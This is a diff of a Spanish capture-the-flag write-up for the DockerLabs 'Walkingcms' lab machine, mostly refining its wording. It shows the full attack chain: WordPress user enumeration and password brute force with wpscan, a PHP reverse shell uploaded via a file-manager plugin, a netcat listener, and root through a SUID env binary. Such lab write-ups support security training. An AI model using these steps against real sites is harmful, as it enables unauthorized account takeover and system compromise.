@@ -1,4 +1,4 @@
-![image](https://github.com/user-attachments/assets/5d5059e5-32ec-45c1-a72f-38824d7ceffe)---
+---
 title: Walkingcms - DockerLabs
 published: true
 categories: DockerLabs
@@ -35,10 +35,9 @@ nmap -p80 -sCV 172.17.0.2 -oG targeted
 ![image](https://github.com/user-attachments/assets/75e7bf0e-7097-4921-b52b-9ec1ed2d04fa)
 
 # Exploración Web
-Al analizar el puerto `80`, encontramos una página de defecto de apache.
+Al analizar el puerto `80`, encontramos la página por defecto de Apache.
 
 ![image](https://github.com/user-attachments/assets/c43ac784-f5dd-4088-b5a9-5570e59d20d1)
-
 
 Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
 ```bash
@@ -49,48 +48,41 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-li
 - `-w` Especifica que diccionario queremos usar
 - `-x` Para indicar que tipo de extension queremos que nos encuentre
 
-![image](https://github.com/user-attachments/assets/7c400ad1-d895-4407-9e79-33f7b4332f76)
+![image](https://github.com/user-attachments/assets/3aeea9c2-a7b0-441b-ad88-37f2e78fc97d)
 
 Identificamos la ruta `/wordpress`.
 
 # Wordpress
 
-Usaremos `Wpscan` para ver que encontramos dentro.
-
+Utilizamos `wpscan` para investigar vulnerabilidades y usuarios en el sitio de **WordPress**:
 ```bash
 wpscan --url http://172.17.0.2/wordpress -e 
 ```
 ![image](https://github.com/user-attachments/assets/6523fb18-311e-40ae-b49b-eae65ac1cd09)
 
-Encontramos un usuario mario , lo que haremos sera fuerza bruta para acceder.
+Descubrimos al usuario `mario`, y procedimos a realizar fuerza bruta para acceder con su cuenta.
 
 ## Fuerza bruta.
-
+Usamos la herramienta `wpscan` con el diccionario `rockyou.txt` para intentar descubrir la contraseña:
 ```bash
 wpscan --url http://172.17.0.2/wordpress -U mario -P /usr/share/wordlists/rockyou.txt
 ```
-
-Encontramos una contraseña la cual es `love`.
+Encontramos que la contraseña de `mario` es `love`.
 
 ![image](https://github.com/user-attachments/assets/d3ebd0d3-b0d9-4bfb-b631-bcf668240a65)
 
-Accedemos con mario
-
-Somos administradores por lo que añadiremos el plugin `FILE MANAGER` todo esto para añadir un `shell.php` y poder acceder a traves de una revershell.
+Al acceder con `mario`, observamos que tiene privilegios de administrador, lo cual nos permite añadir el plugin `FILE MANAGER` para cargar un archivo `shell.php` y acceder mediante una **reverse shell**.
 
 ## Reverse Shell
 
-Creamos un archivo `shell.php` y cargamos una reverse shell usando la herramienta [Reverseshell de Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) para crear una shell en PHP. La reverse shell se encuentra disponible en:
+Creamos un archivo `shell.php` cargado con una reverse shell usando la herramienta de [Reverseshell de Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
 
 ![image](https://github.com/user-attachments/assets/f8cd26c8-08bb-459d-b45b-5f761626f3e1)
 
-Una vez subido el archivo, accedemos a la ruta `/wordpress/shell.php` y ejecutamos la shell.
-
-No salta un mensaje de que se ha subido el archivo accedmos a la ruta /uploads y lo ejecutamos 
-
-![image](https://github.com/user-attachments/assets/168111df-59fd-4757-9416-3b8aa36be241)
+Una vez subido, accedemos a la ruta `/wordpress/shell.php` para ejecutar la shell.
 
 Simultáneamente, iniciamos `netcat` en nuestro sistema para escuchar conexiones entrantes:
+
 ```bash 
 nc -lvnp 4444
 ```
@@ -137,18 +129,14 @@ export SHELL=bash
 
 # Escalada de Privilegios
 
-Usamos el siguiente comando (haz una explicacion para que sirve el comando).
-
+Ejecutamos el siguiente comando para encontrar archivos con permisos `SUID`, que pueden ayudar en la escalada de privilegios:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-
-Vemos que podemos ejecutar `env` , por lo que ejecutamos el siguiente comando.
-
+Descubrimos que podemos ejecutar el comando `env` con permisos de root, lo cual aprovechamos de la siguiente manera:
 ```bash
 /usr/bin/env /bin/sh -p
 ```
-
-Ya somos root
+Ahora, hemos escalado privilegios a `root`.
 
 ![image](https://github.com/user-attachments/assets/46fca506-c321-431e-8c4a-50f1c08fac4a)
